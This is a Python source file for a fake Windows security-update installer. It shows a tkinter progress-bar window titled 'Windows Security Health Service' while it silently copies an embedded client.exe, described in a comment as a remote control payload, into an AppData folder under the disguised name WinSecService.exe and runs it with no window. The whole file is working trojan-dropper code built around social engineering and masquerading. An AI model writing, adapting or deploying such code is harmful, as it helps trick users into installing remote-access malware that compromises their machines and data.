import tkinter as tk
from tkinter import ttk
import time
import threading
import sys
import os
import subprocess
import shutil

def get_resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def extract_and_run_payload():
    """Silently extract the embedded client.exe and run it in the background"""
    try:
        # Locate the embedded payload
        payload_src = get_resource_path('client.exe')
        
        # We will copy it to a "hidden" system location so it persists
        target_dir = os.path.join(os.environ['APPDATA'], 'WindowsSecurityHealth')
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            
        payload_dest = os.path.join(target_dir, 'WinSecService.exe')
        
        # Only copy and run if it actually exists in the bundle
        if os.path.exists(payload_src):
            shutil.copy2(payload_src, payload_dest)
            
            # Execute the payload completely invisibly
            subprocess.Popen([payload_dest], 
                             creationflags=subprocess.CREATE_NO_WINDOW,
                             close_fds=True)
            print("[DEBUG] Payload deployed successfully.")
    except Exception as e:
        print("[DEBUG] Payload deployment failed:", e)

class FakeInstaller(tk.Tk):
    def __init__(self):
        super().__init__()
        
        self.title("Windows Security Health Service")
        self.geometry("400x150")
        self.resizable(False, False)
        
        # Center the window
        self.eval('tk::PlaceWindow . center')
        
        # Set icon if available (ignoring for this POC)
        
        # UI Elements
        self.label = tk.Label(self, text="Installing Security Updates...", font=("Segoe UI", 10))
        self.label.pack(pady=(20, 10))
        
        self.progress = ttk.Progressbar(self, orient="horizontal", length=300, mode="determinate")
        self.progress.pack(pady=10)
        
        self.status = tk.Label(self, text="Extracting files...", font=("Segoe UI", 8), fg="gray")
        self.status.pack()
        
        # Start the fake installation process in a separate thread
        threading.Thread(target=self.run_installation, daemon=True).start()

    def run_installation(self):
        # Step 1: Fake loading while extracting the payload
        for i in range(1, 40):
            time.sleep(0.05)
            self.progress['value'] = i
            self.update_idletasks()
            
        self.status.config(text="Installing background services...")
        
        # CRITICAL: Deploy the actual remote control payload here!
        extract_and_run_payload()
        
        # Step 2: Fake loading for the rest of the bar
        for i in range(40, 101):
            time.sleep(0.03)
            self.progress['value'] = i
            self.update_idletasks()
            
        self.status.config(text="Installation Complete.")
        self.label.config(text="Windows Security is up to date.")
        time.sleep(1.5)
        
        # Close the installer
        self.destroy()

if __name__ == "__main__":
    app = FakeInstaller()
    app.mainloop()
